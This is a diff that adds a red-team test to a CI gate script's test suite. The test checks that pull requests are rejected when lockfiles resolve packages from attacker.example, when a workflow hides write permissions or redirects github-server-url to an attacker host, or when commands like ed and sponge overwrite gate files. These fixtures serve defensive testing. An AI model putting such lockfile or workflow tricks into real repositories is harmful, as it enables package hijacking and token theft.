@@ -2707,7 +2707,7 @@ def test_pr_bodies_manifests_and_ownership_read_as_github_renders_them(repo):
     registry = "docs/product/07-MODEL-REGISTRY.md"
     on_base(repo, {registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | Production |\n| MODEL-MAG-001 | Production |\n"})
     r = pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | RETIRED |\n| MODEL-MAG-001 | Production |\n"}, **title, PR_BODY=body())
-    assert r.returncode == 1 and "changes the row(s) of MODEL-GAMMA-001" in r.stdout, r.stdout
+    assert r.returncode == 1 and "naming MODEL-GAMMA-001" in r.stdout, r.stdout
     on_base(repo, {SPEC: spec() + "\nThis spec retires MODEL-GAMMA-001.\n"})
     assert pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | RETIRED |\n| MODEL-MAG-001 | Production |\n"}, **title, PR_BODY=body()).returncode == 0
 
@@ -2877,3 +2877,87 @@ def test_links_are_not_files_and_deferrals_survive_markup(repo):
     r = pr(repo, BRANCH, CODE, **title, PR_BODY=f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] a, b passes\n- [x] c passes\n")
     assert r.returncode == 0, r.stdout
     on_base(repo, {SPEC: spec()})
+
+
+def test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract(repo):
+    """Red-team round six (spec_gate.py: non_dependency_edit, check, valid_yaml, checkout_violation, Tree.raw,
+    is_process_file, writes_gate_file, check_close_out, check_capacity, shadows_local_skill, check_registry_rows).
+
+    A lockfile resolved every package from an attacker host and CI installed it; a second workflow took
+    a required check's name; a pinned copy was accepted unjudged at step one and from any feature branch;
+    `permissions: # note` hid a write grant; `? permissions` hid the key; `github-server-url` sent the
+    token elsewhere; a CRLF file equalled its LF copy; `ed`, `sponge` and `sort -o` were not writers; a
+    struck Status passed the close-out; a blank line counted as a record change; a capacity value
+    deferred; a vendored skill shadowed a local one; a feature PR re-routed a scheduler row.
+    """
+    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
+    wf = ".github/workflows/spec-gate.yml"
+    typed = gate_workflow()
+    lock = '{"name":"x","lockfileVersion":3,"packages":{"":{"dependencies":{"lodash":"^4.17.21"}},"node_modules/lodash":{"version":"4.17.21","resolved":"https://%s/lodash-4.17.21.tgz","integrity":"sha512-AAAA"}}}\n'
+    r = pr(repo, "chore/bump", {"package-lock.json": lock % "attacker.example"})
+    assert r.returncode == 1 and "public registries only" in r.stdout, r.stdout
+    assert pr(repo, "chore/bump", {"package-lock.json": lock % "registry.npmjs.org"}).returncode == 0
+    r = pr(repo, "chore/bump", {"poetry.lock": '[[package]]\nname = "x"\n[package.source]\ntype = "url"\nurl = "https://attacker.example/x.whl"\n'})
+    assert r.returncode == 1 and "public registries only" in r.stdout, r.stdout
+    twin = "name: spec-gate\non:\n  pull_request:\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
+    cicd_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
+    on_base(repo, {CATALOG: cicd_row})
+    for path in (".github/workflows/spec-gate2.yml", ".github/workflows/Spec-Gate.yml", ".github/workflows/rc2.yml"):
+        r = pr(repo, BRANCH, {**CODE, path: twin}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
+        assert r.returncode == 1 and ("takes the name or a job key" in r.stdout or "belong to FEAT-CICD-001" in r.stdout), (path, r.stdout)
+    r = pr(repo, "chore/gate-workflow", {".github/workflows/rc2.yml": twin.replace("spec-gate", "other").replace("  gate:", "  registry:")}, **cap)
+    assert r.returncode == 1 and "takes the name or a job key" in r.stdout, r.stdout
+    pin = "scripts/gate/pinned/spec-gate.yml"
+    r = pr(repo, "chore/gate-workflow", {pin: "not: [yaml\n"}, **cap)
+    assert r.returncode == 1 and "not valid YAML" in r.stdout, r.stdout
+    r = pr(repo, "chore/gate-workflow", {pin: typed.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n", 1)}, **cap)
+    assert r.returncode == 1 and "write permission" in r.stdout, r.stdout
+    r = pr(repo, BRANCH, {**CODE, pin: typed}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
+    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
+    r = pr(repo, BRANCH, {**CODE, ".claude/skills/product-delivery/SKILL.md": "# nothing\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
+    assert r.returncode == 1 and "belong to FEAT-CICD-001" in r.stdout, r.stdout
+    on_base(repo, {CATALOG: CATALOG_TEXT})
+    hook_pin = "scripts/gate/pinned/pre-commit"
+    r = pr(repo, "chore/gate-hook", {hook_pin: "#!/bin/sh\nset -e\ngit reset -q\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
+    assert r.returncode == 1 and "is not one the hook may carry" in r.stdout, r.stdout
+    for folded in (typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    permissions: # scoped\n      contents: write\n", 1),
+                   typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    ? permissions\n    : write-all\n", 1),
+                   typed.replace("on:\n", "true:\n", 1),
+                   typed.replace("          ref: ${{ github.event.pull_request.base.sha }}\n", "          ref: ${{ github.event.pull_request.base.sha }}\n          github-server-url: https://attacker.example\n", 1)):
+        assert folded != typed
+        r = pr(repo, "chore/gate-workflow", {wf: folded}, **cap)
+        assert r.returncode == 1, (folded[:80], r.stdout)
+    on_base(repo, {pin: typed})
+    _git(repo, "checkout", "-q", "-B", "chore/gate-workflow", "base")
+    write(repo, wf, typed.replace("\n", "\r\n"))
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "crlf")
+    r = gate(repo, "--pr", "base", "HEAD", PR_HEAD_REF="chore/gate-workflow", **cap)
+    assert r.returncode == 1 and ("differs from its pinned copy" in r.stdout or "carriage return" in r.stdout), r.stdout
+    on_base(repo, {pin: None})
+    for pre in ("ed -s scripts/gate/spec_gate.py", "echo x | sponge scripts/gate/spec_gate.py", "sort -o scripts/gate/spec_gate.py lib/model.py"):
+        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap)
+        assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
+    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          cat scripts/gate/spec_gate.py > \"$RUNNER_TEMP/copy\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
+    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
+    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ~~Production~~ | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ~~Production~~")
+    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
+    assert r.returncode == 1 and "struck through" in r.stdout, r.stdout
+    stamped = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
+    on_base(repo, {CATALOG: stamped})
+    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: stamped.replace("### FEAT-MODEL-001\n\n- Status: Production\n", "### FEAT-MODEL-001\n\n- Status: Production\n\n\n", 1)}, **meta)
+    assert r.returncode == 1 and "is unchanged from the base" in r.stdout, r.stdout
+    on_base(repo, {CATALOG: CATALOG_TEXT})
+    r = pr(repo, BRANCH, {**CODE, "gcp/job.py": "x = 1\n"}, PR_TITLE="FEAT-MODEL-001: x",
+           PR_BODY=body() + "\n\n## Capacity\nVolume: 1 row (TBD, will measure in a follow-up)\nVelocity: 1 call\nWall-clock: 1 s\n30: $0\n")
+    assert r.returncode == 1 and "Capacity section defers" in r.stdout, r.stdout
+    for path in (".claude/skills/Product-Delivery/SKILL.md", ".claude/skills/product-delivery-v2/SKILL.md"):
+        r = pr(repo, "bot/superpowers-weekly", {path: "---\nname: x\n---\n"})
+        assert r.returncode == 1, (path, r.stdout)
+    r = pr(repo, "bot/superpowers-weekly", {".claude/skills/superpowers/other/SKILL.md": "---\nname: product-delivery\n---\n"})
+    assert r.returncode == 1, r.stdout
+    registry = "docs/product/07-MODEL-REGISTRY.md"
+    on_base(repo, {registry: "# Registry\n\n| Scheduler | Serves |\n|---|---|\n| `a-daily` | MODEL-GAMMA-001 |\n"})
+    r = pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| Scheduler | Serves |\n|---|---|\n| `a-daily` | MODEL-MAG-001 |\n"}, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
+    assert r.returncode == 1 and "naming MODEL-GAMMA-001" in r.stdout, r.stdout
+    on_base(repo, {registry: None})
